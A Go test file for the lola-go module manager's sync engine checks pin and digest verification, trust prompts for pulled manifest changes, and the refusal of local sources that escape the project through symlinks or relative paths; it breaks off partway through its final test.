package engine_test

import (
	"context"
	"encoding/json"
	"errors"
	"maps"
	"net/http"
	"os"
	"path/filepath"
	"regexp"
	"slices"
	"strings"
	"sync/atomic"

	. "github.com/onsi/ginkgo/v2"
	. "github.com/onsi/gomega"

	"github.com/trevor-vaughan/lola-go/internal/engine"
	"github.com/trevor-vaughan/lola-go/internal/errs"
	"github.com/trevor-vaughan/lola-go/internal/ledger"
	"github.com/trevor-vaughan/lola-go/internal/manifest"
	"github.com/trevor-vaughan/lola-go/internal/paths"
	"github.com/trevor-vaughan/lola-go/internal/source"
	"github.com/trevor-vaughan/lola-go/internal/store"
	"github.com/trevor-vaughan/lola-go/internal/target"
	"github.com/trevor-vaughan/lola-go/internal/testenv"
	"github.com/trevor-vaughan/lola-go/internal/trust"
)

var _ = Describe("Sync", func() {
	var (
		tmp, proj, src, work, bare, url string
		p                               paths.Paths
		e                               *engine.Engine
		sc                              engine.Scope
		requests                        atomic.Int32
		ctx                             = context.Background()
		claude                          = engine.Options{Targets: []string{"claude-code"}}
	)
	BeforeEach(func() {
		var err error
		tmp, err = filepath.EvalSymlinks(testenv.Isolate())
		Expect(err).NotTo(HaveOccurred())
		p, err = paths.Resolve(os.Getenv)
		Expect(err).NotTo(HaveOccurred())
		e = engine.New(p)
		proj = filepath.Join(tmp, "proj")
		e.Getwd = func() (string, error) { return proj, nil } // hints are written for a user in the project
		Expect(os.MkdirAll(proj, 0o755)).To(Succeed())
		sc = engine.Scope{Kind: target.Project, ProjectDir: proj}
		src = filepath.Join(tmp, "src", "other")
		writeTree(src, map[string]string{"lola.yml": "name: other\n", "commands/other.md": "Other\n"})
		// A git repository holding exampleModule on main, tagged v1, served over loopback; requests
		// counts what the server receives.
		work, bare = filepath.Join(tmp, "work"), filepath.Join(tmp, "srv", "example.git")
		writeTree(work, exampleModule)
		gitIn(work, "init", "-q", "-b", "main")
		gitIn(work, "add", "-A")
		gitIn(work, "commit", "-q", "-m", "init")
		gitIn(work, "tag", "v1")
		gitIn(tmp, "clone", "-q", "--bare", work, bare)
		requests.Store(0)
		url = testenv.ServeGitWith(filepath.Join(tmp, "srv"), func(*http.Request) { requests.Add(1) }) + "/example.git"
	})
	push := func(files map[string]string) string {
		writeTree(work, files)
		gitIn(work, "add", "-A")
		gitIn(work, "commit", "-q", "-m", "change")
		gitIn(work, "push", "-q", "-f", "--all", bare)
		gitIn(work, "push", "-q", "-f", "--tags", bare)
		return gitIn(work, "rev-parse", "HEAD")
	}
	install := func(sc engine.Scope, args ...engine.InstallRequest) {
		GinkgoHelper()
		_, err := e.Install(ctx, sc, proj, args, claude)
		Expect(err).NotTo(HaveOccurred())
	}
	sync := func(req engine.SyncRequest) (*engine.SyncResult, error) {
		if req.Scope == (engine.Scope{}) {
			req.Scope = sc
		}
		return e.Sync(ctx, req)
	}
	read := func(rel string) string {
		GinkgoHelper()
		b, err := os.ReadFile(filepath.Join(proj, rel))
		Expect(err).NotTo(HaveOccurred())
		return string(b)
	}
	lockFile := func() *ledger.Ledger {
		GinkgoHelper()
		l, err := ledger.Load(filepath.Join(proj, ".lola", "lock.json"))
		Expect(err).NotTo(HaveOccurred())
		return l
	}
	loadManifest := func() *manifest.Manifest {
		GinkgoHelper()
		m, err := e.Manifest(sc)
		Expect(err).NotTo(HaveOccurred())
		return m
	}
	// state is the bytes of the project's state, the trust record and the cache, which a refused
	// sync leaves as they were.
	state := func() map[string]string {
		GinkgoHelper()
		out := map[string]string{}
		for _, dir := range []string{proj, filepath.Dir(p.Store), filepath.Dir(p.Trust)} {
			Expect(filepath.WalkDir(dir, func(path string, d os.DirEntry, err error) error {
				if err != nil || d.IsDir() || strings.Contains(path, string(filepath.Separator)+"locks"+string(filepath.Separator)) {
					return err
				}
				if d.Type()&os.ModeSymlink != 0 {
					target, err := os.Readlink(path)
					out[path] = "link to " + target
					return err
				}
				b, err := os.ReadFile(path)
				out[path] = string(b)
				return err
			})).To(Succeed())
		}
		return out
	}
	// checkout makes the project look like a fresh checkout of what lola wrote: project.yml as
	// committed, nothing rendered or installed. The trust record stays.
	checkout := func() {
		GinkgoHelper()
		for _, rel := range []string{".claude", ".mcp.json", "CLAUDE.md", ".lola/lock.json", ".lola/modules", ".lola/plugin-data"} {
			Expect(os.RemoveAll(filepath.Join(proj, rel))).To(Succeed())
		}
	}

	// pull changes project.yml the way a git pull would: behind lola's back.
	pull := func(c manifest.Change) {
		GinkgoHelper()
		dst, data, err := manifest.Edit(filepath.Join(proj, ".lola", "project.yml"), c)
		Expect(err).NotTo(HaveOccurred())
		Expect(os.WriteFile(dst, data, 0o644)).To(Succeed())
	}
	// pinFor is the entry lola would write for the repository at ref, as a teammate's install
	// pins it; it leaves the version in the cache.
	pinFor := func(ref string) manifest.Entry {
		GinkgoHelper()
		other := filepath.Join(tmp, "teammate")
		Expect(os.MkdirAll(other, 0o755)).To(Succeed())
		oc := engine.Scope{Kind: target.Project, ProjectDir: other}
		_, err := e.Install(ctx, oc, other, []engine.InstallRequest{{Arg: url, Ref: ref}}, claude)
		Expect(err).NotTo(HaveOccurred())
		m, err := e.Manifest(oc)
		Expect(err).NotTo(HaveOccurred())
		Expect(os.RemoveAll(other)).To(Succeed())
		return *m.Find("example")
	}
	var asked []engine.TrustReport
	yes := func(rep engine.TrustReport) (engine.TrustAnswer, error) {
		asked = append(asked, rep)
		return engine.TrustAnswer{All: true}, nil
	}
	var removals [][]engine.Removal
	confirm := func(rs []engine.Removal) (bool, error) {
		removals = append(removals, rs)
		return true, nil
	}
	BeforeEach(func() { asked, removals = nil, nil })
	covered := func() bool {
		GinkgoHelper()
		r, err := e.Trust.Load(proj)
		Expect(err).NotTo(HaveOccurred())
		return trust.Check(r, trust.ViewOf(loadManifest())).Status == trust.StatusTrusted
	}

	It("installs every entry at its pin, and a second run is already in sync", func() {
		install(sc, engine.InstallRequest{Arg: url, Ref: "v1"}, engine.InstallRequest{Arg: src})
		pinned := loadManifest().Find("example")
		checkout()

		// Without lock.json no folder version is installed to trust the folder's content by.
		res, err := sync(engine.SyncRequest{Trust: yes})
		Expect(err).NotTo(HaveOccurred())
		Expect(asked).To(HaveExactElements(HaveField("Changes", HaveExactElements(HaveField("Module", "other")))))
		Expect(res.InSync).To(BeFalse())
		Expect(res.Scope).To(Equal("project"))
		Expect(res.Root).To(Equal(proj))
		Expect(res.Pins).To(BeEmpty())
		Expect(read(".claude/commands/ship.md")).To(Equal("Ship $ARGUMENTS\n"))
		Expect(read(".claude/commands/other.md")).To(Equal("Other\n"))
		Expect(lockFile().Modules["example"]).To(And(HaveField("Digest", pinned.Digest), HaveField("Commit", pinned.Commit),
			HaveField("Ref", "v1"), HaveField("Source", url)))
		Expect(lockFile().Modules).To(HaveKey("other"))
		Expect(filepath.Join(proj, ".lola", "modules", "example")).To(BeADirectory())

		before := state()
		res, err = sync(engine.SyncRequest{})
		Expect(err).NotTo(HaveOccurred())
		Expect(res.InSync).To(BeTrue())
		Expect(res.Steps).To(BeEmpty())
		Expect(state()).To(Equal(before), "a second run writes nothing")
	})

	It("sync installs the pinned commit after its tag moved", func() {
		install(sc, engine.InstallRequest{Arg: url, Ref: "v1"})
		pinned := loadManifest().Find("example")
		gitIn(work, "tag", "-d", "v1")
		push(map[string]string{"commands/ship.md": "Ship v2\n"})
		gitIn(work, "tag", "v1")
		gitIn(work, "push", "-q", "-f", "--tags", bare)
		_, err := e.Update(ctx, nil)
		Expect(err).NotTo(HaveOccurred())
		head, _, err := e.Store.Head("example", "v1")
		Expect(err).NotTo(HaveOccurred())
		Expect(head.Meta.Digest).NotTo(Equal(pinned.Digest), "the cache's head moved with the tag")

		for _, cached := range []bool{true, false} {
			checkout()
			if !cached {
				Expect(e.Store.Remove("example")).To(BeTrue())
			}
			_, err = sync(engine.SyncRequest{})
			Expect(err).NotTo(HaveOccurred(), "cached: %v", cached)
			Expect(read(".claude/commands/ship.md")).To(Equal("Ship $ARGUMENTS\n"), "cached: %v", cached)
			Expect(lockFile().Modules["example"].Digest).To(Equal(pinned.Digest))
			Expect(loadManifest().Find("example")).To(Equal(pinned), "the pin stays")
		}
		after, _, err := e.Store.Head("example", "v1")
		Expect(err).NotTo(HaveOccurred())
		Expect(after.Meta.Digest).To(Equal(pinned.Digest), "a pinned fetch sets a head only where there is none")
	})

	It("reports the same findings for a version fetched again as for one the cache holds", func() {
		push(map[string]string{".claude-plugin/plugin.json": `{"name":"example","x-extra":"kept"}`})
		install(sc, engine.InstallRequest{Arg: url, Ref: "main"})
		checkout()
		dry := engine.Options{DryRun: true}
		hit, err := sync(engine.SyncRequest{Options: dry})
		Expect(err).NotTo(HaveOccurred())
		Expect(e.Store.Remove("example")).To(BeTrue())

		miss, err := sync(engine.SyncRequest{Options: dry})
		Expect(err).NotTo(HaveOccurred())
		Expect(miss.Findings).To(Equal(hit.Findings), "the cache state never changes what sync reports")
		Expect(miss.Findings).NotTo(ContainElement(HaveField("Text", ContainSubstring("x-extra"))), "a format adapter's warning is install's, not sync's")
	})

	It("sync refuses content that does not match its pin and writes nothing", func() {
		refused := func(err error, pin string) {
			GinkgoHelper()
			Expect(err).To(MatchError(MatchRegexp(`^example: the source now serves different content than project.yml pins \(pinned ` + pin +
				`, got sha256:[0-9a-f]{64}\)$`)))
			Expect(errs.Hints(err)).To(Equal([]string{"if you expect the change, re-pin it: lola sync --project --update example",
				"otherwise the source changed under the same ref or commit: check it before re-pinning"}))
		}
		// git: a pulled pin whose digest is not the content of its commit
		entry := pinFor("v1")
		entry.Digest = "sha256:" + strings.Repeat("0", 64)
		install(sc, engine.InstallRequest{Arg: src})
		pull(manifest.Change{Set: []manifest.Entry{entry}})
		before := state()
		_, err := sync(engine.SyncRequest{Trust: yes})
		refused(err, entry.Digest)
		Expect(state()).To(Equal(before))

		// archive: the file behind a trusted pin replaced
		archive := filepath.Join(tmp, "example.tgz")
		Expect(os.WriteFile(archive, tarGz("example", exampleModule), 0o644)).To(Succeed())
		pull(manifest.Change{Remove: []string{"example"}})
		Expect(e.Store.Remove("example")).To(BeTrue())
		install(sc, engine.InstallRequest{Arg: archive})
		pin := loadManifest().Find("example").Digest
		checkout()
		Expect(e.Store.Remove("example")).To(BeTrue())
		Expect(os.WriteFile(archive, tarGz("example", map[string]string{"commands/ship.md": "replaced\n"}), 0o644)).To(Succeed())
		before = state()
		_, err = sync(engine.SyncRequest{Trust: yes}) // the folder other has no version installed
		refused(err, pin)
		Expect(state()).To(Equal(before))
	})

	It("pins an unpinned entry at user scope, writing the pin to user.yml with the install", func() {
		user := engine.Scope{Kind: target.User}
		writeTree(filepath.Dir(p.UserManifest), map[string]string{filepath.Base(p.UserManifest): "version: 1\ntargets: [claude-code]\nmodules:\n" +
			"  - name: example # kept\n    source: " + url + "\n    ref: v1\n"})
		res, err := sync(engine.SyncRequest{Scope: user})
		Expect(err).NotTo(HaveOccurred())
		commit := gitIn(work, "rev-parse", "v1")
		Expect(res.Pins).To(HaveExactElements(And(HaveField("Module", "example"), HaveField("Ref", "v1"), HaveField("Commit", commit),
			HaveField("Digest", MatchRegexp(`^sha256:[0-9a-f]{64}$`)), HaveField("PreviousDigest", ""), HaveField("Reason", engine.PinUnpinned),
			HaveField("Written", true))))
		m, err := e.Manifest(user)
		Expect(err).NotTo(HaveOccurred())
		Expect(m.Find("example")).To(And(HaveField("Commit", commit), HaveField("Digest", res.Pins[0].Digest)))
		b, err := os.ReadFile(p.UserManifest)
		Expect(err).NotTo(HaveOccurred())
		Expect(string(b)).To(ContainSubstring("# kept"), "the comment survives the edit")
		Expect(filepath.Join(p.Home, ".claude", "commands", "ship.md")).To(BeARegularFile())
		head, ok, err := e.Store.Head("example", "v1")
		Expect(err).NotTo(HaveOccurred())
		Expect(ok).To(BeTrue(), "the fetch is published with its head")
		Expect(head.Meta.Digest).To(Equal(res.Pins[0].Digest))
		Expect(p.Trust).NotTo(BeAnExistingFile(), "user scope has no trust record")

		res, err = sync(engine.SyncRequest{Scope: user})
		Expect(err).NotTo(HaveOccurred())
		Expect(res.InSync).To(BeTrue())
	})

	It("fetches the module of an entry that names no module itself under the entry's name, in every fetch", func() {
		user := engine.Scope{Kind: target.User}
		Expect(os.MkdirAll(filepath.Dir(p.UserManifest), 0o700)).To(Succeed())
		Expect(os.WriteFile(p.UserManifest, []byte("version: 1\ntargets: [claude-code]\nmodules:\n  - name: tools\n    source: "+url+"\n"), 0o600)).
			To(Succeed())
		_, err := sync(engine.SyncRequest{Scope: user})
		Expect(err).NotTo(HaveOccurred(), "the repository is example, and the entry calls its module tools")
		names, err := e.Store.Names()
		Expect(err).NotTo(HaveOccurred())
		Expect(names).To(Equal([]string{"tools"}))
		_, err = e.Update(ctx, []string{"tools"})
		Expect(err).NotTo(HaveOccurred())
		Expect(e.Store.Remove("tools")).To(BeTrue())
		_, err = e.Render(ctx, user, engine.Options{})
		Expect(err).NotTo(HaveOccurred(), "render fetches the pinned version again under the entry's name")
	})

	Describe("trust", func() {
		It("asks to trust a pulled entry, installs it on a yes, and records the trust after the apply", func() {
			install(sc, engine.InstallRequest{Arg: src})
			entry := pinFor("v1")
			Expect(e.Store.Remove("example")).To(BeTrue())
			pull(manifest.Change{Set: []manifest.Entry{entry}})
			Expect(covered()).To(BeFalse())

			res, err := sync(engine.SyncRequest{Trust: yes})
			Expect(err).NotTo(HaveOccurred())
			Expect(asked).To(HaveLen(1))
			Expect(asked[0].Status).To(Equal("changed"))
			Expect(asked[0].Changes).To(HaveExactElements(And(HaveField("Module", "example"), HaveField("Kind", "added"),
				HaveField("ContentFixed", true))))
			Expect(res.Trust).To(And(HaveField("Status", "changed"), HaveField("Recorded", true)))
			Expect(read(".claude/commands/ship.md")).To(Equal("Ship $ARGUMENTS\n"))
			Expect(covered()).To(BeTrue())
			_, found, err := e.Store.Origin("example")
			Expect(err).NotTo(HaveOccurred())
			Expect(found).To(BeTrue(), "trusted content enters the cache")

			asked = nil
			res, err = sync(engine.SyncRequest{Trust: yes})
			Expect(err).NotTo(HaveOccurred())
			Expect(asked).To(BeEmpty(), "a trusted manifest asks nothing")
			Expect(res.InSync).To(BeTrue())
			Expect(res.Trust).To(And(HaveField("Status", "trusted"), HaveField("Recorded", false)))
		})

		It("writes nothing and caches none of the pulled content on a No", func() {
			install(sc, engine.InstallRequest{Arg: src})
			entry := pinFor("v1")
			Expect(e.Store.Remove("example")).To(BeTrue())
			pull(manifest.Change{Set: []manifest.Entry{entry}})
			before := state()
			_, err := sync(engine.SyncRequest{Trust: func(engine.TrustReport) (engine.TrustAnswer, error) { return engine.TrustAnswer{}, nil }})
			Expect(err).To(MatchError(engine.ErrDeclined))
			Expect(state()).To(Equal(before), "no cache, project or trust record change")
		})

		It("sync -y off a terminal refuses a pulled entry without --trust", func() {
			install(sc, engine.InstallRequest{Arg: src})
			entry := pinFor("v1")
			Expect(e.Store.Remove("example")).To(BeTrue())
			unpinned := entry
			unpinned.Commit, unpinned.Digest = "", ""
			refused := func(name string, req engine.SyncRequest, want string) *engine.TrustRefusalError {
				GinkgoHelper()
				requests.Store(0)
				before := state()
				req.ConfirmRemovals = confirm // -y
				_, err := sync(req)
				Expect(err).To(MatchError("lola sync needs your trust for "+want+", and there is no terminal to ask on; "+
					"-y confirms removals only; accept them with --trust=entries"), name)
				flags := ""
				if req.Update {
					flags = " --update"
				}
				Expect(errs.Hints(err)).To(Equal([]string{"see them: lola sync --project" + flags + " -n", "then accept them: lola sync --project" + flags + " --trust=entries -y"}), name)
				refusal, ok := errors.AsType[*engine.TrustRefusalError](err)
				Expect(ok).To(BeTrue(), name)
				Expect(requests.Load()).To(BeZero(), "%s: the git server saw no request", name)
				Expect(state()).To(Equal(before), "%s: nothing installed, cached or recorded", name)
				return refusal
			}
			for name, c := range map[string]struct {
				change manifest.Change
				want   string
			}{
				"a pulled pinned entry":   {manifest.Change{Set: []manifest.Entry{entry}}, "changes to .lola/project.yml"},
				"a pulled unpinned entry": {manifest.Change{Set: []manifest.Entry{unpinned}}, "changes to .lola/project.yml and the pins it would write for example"},
			} {
				pull(manifest.Change{Remove: []string{"example"}})
				pull(c.change)
				refusal := refused(name, engine.SyncRequest{}, c.want)
				Expect(refusal.Report.Changes).To(HaveExactElements(And(HaveField("Module", "example"), HaveField("Kind", "added"))), name)
			}

			// --force answers the removals and conflicts, never the trust question (user decision,
			// 2026-10-22).
			requests.Store(0)
			before := state()
			_, err := sync(engine.SyncRequest{Options: engine.Options{Force: true}})
			// The last case of the map above is either pulled entry: its pins may or may not be named.
			Expect(err).To(MatchError(And(HavePrefix("lola sync needs your trust for changes to .lola/project.yml"),
				HaveSuffix(", and there is no terminal to ask on"))))
			Expect(errs.Hints(err)).To(Equal([]string{"see them: lola sync --project --force -n", "then accept them: lola sync --project --force --trust=entries"}))
			Expect(requests.Load()).To(BeZero())
			Expect(state()).To(Equal(before))

			// --update of an entry the user installed, pinned and cached: the record covers it, so the
			// refusal names the entry it would re-pin, with no field changes yet.
			pull(manifest.Change{Remove: []string{"example"}})
			install(sc, engine.InstallRequest{Arg: url, Ref: "v1"})
			Expect(covered()).To(BeTrue())
			refusal := refused("--update of a trusted entry", engine.SyncRequest{Update: true}, "the pins it would write for example")
			Expect(refusal.Report.Changes).To(HaveExactElements(And(HaveField("Module", "example"), HaveField("Fields", BeEmpty()),
				HaveField("Reason", "re-pin from v1 (--update; not fetched yet)"))))
			Expect(refusal.Report.ManifestChanged).To(BeFalse())
		})

		It("off a terminal, one refusal names every answer the run needs", func() {
			install(sc, engine.InstallRequest{Arg: url, Ref: "v1"}, engine.InstallRequest{Arg: src})
			pulled := *loadManifest().Find("example")
			pulled.Ref = "main"
			pull(manifest.Change{Set: []manifest.Entry{pulled}, Remove: []string{"other"}})
			before := state()
			for _, c := range []struct {
				name     string
				req      engine.SyncRequest
				msg      string
				hints    []string
				trust    bool
				removals bool
			}{
				{"neither --trust nor -y", engine.SyncRequest{},
					"your trust for changes to .lola/project.yml; and your confirmation to remove other",
					[]string{"see them: lola sync --project -n", "then accept them: lola sync --project --trust=entries -y"}, true, true},
				{"-y alone", engine.SyncRequest{ConfirmRemovals: confirm}, "your trust for changes to .lola/project.yml",
					[]string{"see them: lola sync --project -n", "then accept them: lola sync --project --trust=entries -y"},
					true, false},
				{"--trust alone", engine.SyncRequest{Options: engine.Options{Trust: engine.TrustEntries}}, "your confirmation to remove other",
					[]string{"see them: lola sync --project --trust=entries -n", "then confirm them: lola sync --project --trust=entries -y"}, false, true},
			} {
				requests.Store(0)
				_, err := sync(c.req)
				msg := "lola sync needs " + c.msg + ", and there is no terminal to ask on"
				if c.req.ConfirmRemovals != nil && c.trust {
					msg += "; -y confirms removals only; accept them with --trust=entries"
				}
				Expect(err).To(MatchError(msg), c.name)
				Expect(errs.Hints(err)).To(Equal(c.hints), c.name)
				refusal, ok := errors.AsType[*engine.TrustRefusalError](err)
				Expect(ok).To(BeTrue(), c.name)
				if c.trust {
					Expect(refusal.Report.Changes).To(ContainElements(HaveField("Module", "example"), HaveField("Module", "other")), c.name)
				} else {
					Expect(refusal.Report.Changes).To(BeEmpty(), c.name)
				}
				if c.removals {
					Expect(refusal.Removals).To(HaveExactElements(HaveField("Module", "other")), c.name)
				} else {
					Expect(refusal.Removals).To(BeEmpty(), c.name)
				}
				Expect(requests.Load()).To(BeZero(), "%s: the git server saw no request", c.name)
				Expect(state()).To(Equal(before), c.name)
				Expect(asked).To(BeEmpty(), "%s: --trust is not asked before the refusal", c.name)
				Expect(removals).To(BeEmpty(), c.name)
			}

			// Every hint leads to lola sync --project --trust=entries -y, which applies: no refusal loop.
			_, err := sync(engine.SyncRequest{Trust: yes, ConfirmRemovals: confirm})
			Expect(err).NotTo(HaveOccurred())
			Expect(lockFile().Modules).NotTo(HaveKey("other"))
			Expect(filepath.Join(proj, ".claude/commands/other.md")).NotTo(BeAnExistingFile())
			Expect(lockFile().Modules["example"].Ref).To(Equal("main"))
			res, err := sync(engine.SyncRequest{})
			Expect(err).NotTo(HaveOccurred())
			Expect(res.InSync).To(BeTrue())
		})

		It("syncs --update of folders alone off a terminal: a folder is never pinned", func() {
			install(sc, engine.InstallRequest{Arg: src})
			res, err := sync(engine.SyncRequest{Update: true})
			Expect(err).NotTo(HaveOccurred())
			Expect(res.Pins).To(BeEmpty())
		})

		It("sync refuses a pinned commit that is not on its ref", func() {
			gitIn(work, "checkout", "-q", "-b", "unreviewed")
			push(map[string]string{"commands/ship.md": "Ship unreviewed\n"})
			entry := pinFor("unreviewed")
			entry.Ref = "main"
			install(sc, engine.InstallRequest{Arg: src})
			pull(manifest.Change{Set: []manifest.Entry{entry}})
			for _, cached := range []bool{true, false} {
				if !cached {
					Expect(e.Store.Remove("example")).To(BeTrue())
				}
				before := state()
				_, err := sync(engine.SyncRequest{Trust: yes})
				Expect(err).To(MatchError("example: commit "+entry.Commit+" is not on main at "+url), "cached: %v", cached)
				Expect(errs.Hints(err)).To(Equal([]string{"re-pin to what main serves: lola sync --project --update example"}))
				Expect(state()).To(Equal(before), "cached: %v", cached)
			}
		})

		It("a local source that leaves the project is refused unless lola wrote it", func() {
			inside := filepath.Join(proj, "mods", "inside")
			writeTree(inside, map[string]string{"lola.yml": "name: inside\n", "commands/inside.md": "Inside\n"})
			install(sc, engine.InstallRequest{Arg: inside})
			Expect(os.Symlink(src, filepath.Join(proj, "mods", "link"))).To(Succeed())
			archive := filepath.Join(tmp, "other.tgz")
			Expect(os.WriteFile(archive, tarGz("other", map[string]string{"commands/other.md": "Other\n"}), 0o644)).To(Succeed())
			for source, location := range map[string]string{
				"mods/link":         src,
				"../src/other":      src,
				src:                 src,
				"file://" + src:     src,
				"../other.tgz":      archive,
				"file://" + archive: archive,
			} {
				pull(manifest.Change{Set: []manifest.Entry{{Name: "other", Source: source}}})
				before := state()
				_, err := sync(engine.SyncRequest{Trust: yes, ConfirmRemovals: confirm}) // -y --trust
				Expect(err).To(MatchError("other: local source "+source+" resolves outside the project ("+location+")"), source)
				Expect(errs.Hints(err)).To(Equal([]string{"install it yourself if you trust it: lola install --project " + location}), source)
				Expect(asked).To(BeEmpty(), "%s: refused before the diff", source)
				Expect(state()).To(Equal(before), source)
			}

			// lola wrote it: an install by its source records the entry as trusted.
			pull(manifest.Change{Remove: []string{"other"}})
			install(sc, engine.InstallRequest{Arg: src})
			checkout()
			_, err := sync(engine.SyncRequest{Trust: yes}) // no version of the folder is installed
			Expect(err).NotTo(HaveOccurred())
			Expect(read(".claude/commands/other.md")).To(Equal("Other\n"))
			asked = nil

			// A pull can turn a folder lola wrote inside the project into a link out of it: the
			// entry as written still names the project, so it is checked though it is covered.
			real := filepath.Join(proj, "mods", "real")
			writeTree(real, map[string]string{"lola.yml": "name: real\n", "commands/real.md": "Real\n"})
			install(sc, engine.InstallRequest{Arg: "mods/real"})
			outside := filepath.Join(tmp, "outside", "real")
			writeTree(outside, map[string]string{"lola.yml": "name: real\n", "commands/real.md": "Outside\n"})
			Expect(os.RemoveAll(real)).To(Succeed())
			Expect(os.Symlink(outside, real)).To(Succeed())
			Expect(e.Store.Remove("real")).To(BeTrue()) // as the refusal of another source for the name coaches
			Expect(covered()).To(BeTrue())
			for _, t := range []func(engine.TrustReport) (engine.TrustAnswer, error){nil, yes} {
				before := state()
				_, err = sync(engine.SyncRequest{Trust: t, ConfirmRemovals: confirm})
				Expect(err).To(MatchError("real: local source mods/real resolves outside the project (" + outside + ")"))
				Expect(errs.Hints(err)).To(Equal([]string{"install it yourself if you trust it: lola install --project " + outside}))
				Expect(asked).To(BeEmpty())
				Expect(state()).To(Equal(before))
			}
		})

		It("a vars edit of a trusted folder outside the project is asked about, not refused as leaving it", func() {
			varied := filepath.Join(tmp, "src", "varied")
			writeTree(varied, map[string]string{"lola.yml": "name: varied\nvars: {team: core}\n",
				"commands/v.md.liquid": "Team {{ vars.team }}.\n"})
			install(sc, engine.InstallRequest{Arg: varied})
			platform := map[string]any{"team": "platform"}

			// (a) The record names the same Source and Path: only the vars changed, which trust asks about.
			pull(manifest.Change{Set: []manifest.Entry{{Name: "varied", Source: varied, Vars: platform}}})
			before := state()
			_, err := sync(engine.SyncRequest{})
			Expect(err).To(MatchError("lola sync needs your trust for changes to .lola/project.yml, and there is no terminal to ask on"))
			Expect(state()).To(Equal(before))
			_, err = sync(engine.SyncRequest{Trust: yes})
			Expect(err).NotTo(HaveOccurred())
			Expect(read(".claude/commands/v.md")).To(Equal("Team platform.\n"))

			// (b) Another Source or Path outside the project, even for the same folder, is refused.
			Expect(e.Store.Remove("varied")).To(BeTrue()) // as the refusal of another source for the name coaches
			for _, ent := range []manifest.Entry{
				{Name: "varied", Source: filepath.Dir(varied), Path: "varied", Vars: platform},
				{Name: "varied", Source: varied, Path: "commands", Vars: platform},
				{Name: "varied", Source: "../src/varied", Vars: platform},
			} {
				pull(manifest.Change{Set: []manifest.Entry{ent}})
				before := state()
				_, err := sync(engine.SyncRequest{Trust: yes})
				Expect(err).To(MatchError(ContainSubstring("varied: local source "+ent.Source+" resolves outside the project")), ent.Source)
				Expect(state()).To(Equal(before), ent.Source)
			}

			// (c) A source written inside the project that now leads out through a link is refused,
			// though the record names the same Source.
			inner := filepath.Join(proj, "mods", "inner")
			writeTree(inner, map[string]string{"lola.yml": "name: inner\nvars: {team: core}\n", "commands/i.md.liquid": "Team {{ vars.team }}.\n"})
			install(sc, engine.InstallRequest{Arg: "mods/inner"})
			outside := filepath.Join(tmp, "outside", "inner")
			writeTree(outside, map[string]string{"lola.yml": "name: inner\nvars: {team: core}\n", "commands/i.md.liquid": "Outside {{ vars.team }}.\n"})
			Expect(os.RemoveAll(inner)).To(Succeed())
			Expect(os.Symlink(outside, inner)).To(Succeed())
			pull(manifest.Change{Set: []manifest.Entry{{Name: "inner", Source: "mods/inner", Vars: platform}}})
			before = state()
			_, err = sync(engine.SyncRequest{Trust: yes})
			Expect(err).To(MatchError("inner: local source mods/inner resolves outside the project (" + outside + ")"))
			Expect(state()).To(Equal(before))

			// (d) So is one that names the project from outside it, ../<project>/…: lola judges a
			// relative source after joining it to the project.
			viaParent := "../" + filepath.Base(proj) + "/mods/back"
			back := filepath.Join(proj, "mods", "back")
			writeTree(back, map[string]string{"lola.yml": "name: back\nvars: {team: core}\n", "commands/b.md.liquid": "Team {{ vars.team }}.\n"})
			pull(manifest.Change{Set: []manifest.Entry{{Name: "back", Source: viaParent}}}) // as a teammate wrote it
			_, err = sync(engine.SyncRequest{Modules: []string{"back"}, Trust: yes})
			Expect(err).NotTo(HaveOccurred(), "trusted while it is inside the project")
			outsideBack := filepath.Join(tmp, "outside", "back")
			writeTree(outsideBack, map[string]string{"lola.yml": "name: back\nvars: {team: core}\n", "commands/b.md.liquid": "Outside {{ vars.team }}.\n"})
			Expect(os.RemoveAll(back)).To(Succeed())
			Expect(os.Symlink(outsideBack, back)).To(Succeed())
			pull(manifest.Change{Set: []manifest.Entry{{Name: "back", Source: viaParent, Vars: platform}}})
			before = state()
			_, err = sync(engine.SyncRequest{Modules: []string{"back"}, Trust: yes})
			Expect(err).To(MatchError("back: local source " + viaParent + " resolves outside the project (" + outsideBack + ")"))
			Expect(state()).To(Equal(before))
		})

		It("a containment refusal's install hint covers an entry without targets of its own", func() {
			Expect(os.MkdirAll(filepath.Join(proj, ".lola"), 0o755)).To(Succeed())
			Expect(os.WriteFile(filepath.Join(proj, ".lola", "project.yml"), []byte("version: 1\ntargets: [claude-code]\nmodules:\n"+
				"  - name: other\n    source: "+src+"\n"), 0o600)).To(Succeed())
			_, err := sync(engine.SyncRequest{Trust: yes})
			Expect(err).To(MatchError(ContainSubstring("other: local source " + src + " resolves outside the project")))
			Expect(errs.Hints(err)).To(Equal([]string{"install it yourself if you trust it: lola install --project " + src}))
			install(sc, engine.InstallRequest{Arg: src}) // as hinted
			_, err = sync(engine.SyncRequest{Trust: yes})
			Expect(err).NotTo(HaveOccurred(), "the entry is covered: only the hand-written top-level targets are asked about")
			Expect(asked).To(HaveLen(1))
			Expect(asked[0].Targets).NotTo(BeNil())
		})

		It("a containment refusal's install hint works when the cache's source for the name is gone", func() {
			moved := filepath.Join(tmp, "moved", "other")
			writeTree(moved, map[string]string{"lola.yml": "name: other\n", "commands/other.md": "Other\n"})
			_, err := e.Install(ctx, engine.Scope{Kind: target.User}, tmp, []engine.InstallRequest{{Arg: moved}}, claude)
			Expect(err).NotTo(HaveOccurred())
			Expect(os.RemoveAll(moved)).To(Succeed())
			Expect(os.MkdirAll(filepath.Join(proj, ".lola"), 0o755)).To(Succeed())
			Expect(os.WriteFile(filepath.Join(proj, ".lola", "project.yml"), []byte("version: 1\ntargets: [claude-code]\nmodules:\n"+
				"  - name: other\n    source: "+src+"\n"), 0o600)).To(Succeed())
			_, err = sync(engine.SyncRequest{Trust: yes})
			Expect(err).To(MatchError(ContainSubstring("other: local source " + src + " resolves outside the project")))
			Expect(errs.Hints(err)).To(Equal([]string{"install it yourself if you trust it: lola install --project " + src}))
			install(sc, engine.InstallRequest{Arg: src}) // as hinted: the one-source rule does not stand in its way
			_, err = sync(engine.SyncRequest{Trust: yes})
			Expect(err).NotTo(HaveOccurred(), "the entry is covered: only the hand-written top-level targets are asked about")
			Expect(asked).To(HaveLen(1))
			Expect(asked[0].Targets).NotTo(BeNil())
		})

		It("a containment refusal's install hint names the project when run from outside it", func() {
			Expect(os.MkdirAll(filepath.Join(proj, ".lola"), 0o755)).To(Succeed())
			Expect(os.WriteFile(filepath.Join(proj, ".lola", "project.yml"), []byte("version: 1\ntargets: [claude-code]\nmodules:\n"+
				"  - name: other\n    source: "+src+"\n"), 0o600)).To(Succeed())
			e.Getwd = func() (string, error) { return tmp, nil }
			_, err := sync(engine.SyncRequest{Trust: yes})
